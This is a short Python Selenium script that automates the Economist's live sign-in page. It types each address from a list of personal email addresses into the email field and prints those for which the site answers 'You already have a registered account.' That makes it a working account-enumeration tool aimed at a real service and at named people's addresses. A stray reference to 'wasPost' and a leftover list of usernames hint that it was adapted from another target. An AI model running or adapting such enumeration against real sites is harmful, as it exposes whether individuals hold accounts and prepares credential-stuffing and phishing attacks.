from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')

print("The usernames present in wasPost are:")

#for i in ["BegForMercy", "BraiasjdnkjnAxe", "CrazyMind", "DeathWaasdaish", "DisasterMaster", "ElNaaaino", "EndlessFacepalms", "FreakingOblin", "GhostlyPresence", "GridlockAndKey", "HoofHearted666", "KungFuMonk", "NineTees", "PlzJustDie", "SeekNDestroy", "SinisterChill", "BegqwForMercy", "BasxasdxrainAxe", "Crazy1Mind", "DeatasdasdhWish", "Dis1asterMaster", "EaslNino", "EndlessFaaacepalms", "FrrreakingOblin", "GhossdtlyPreseasnce", "GrisadlockAndKey", "HoofaHearted666", "KsungFuMonk", "NinessTees", "sPlzJustDie", "sSeeksNDestroy", "SssinisddterChill"]:
for i in [ "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
    user = i

    driver.get("https://myaccount.economist.com/s/authentication?starturl=https%3A%2F%2Fsubscribenow.economist.com%2Fcheckout")
    p1 = driver.page_source
    sleep(2)
    elem=driver.find_element_by_xpath("//input[@type='text']")
    #elem = driver.find_element_by_name("email")
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(3)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)

    if "You already have a registered account." in p3:
        print(i)
    sleep(2)

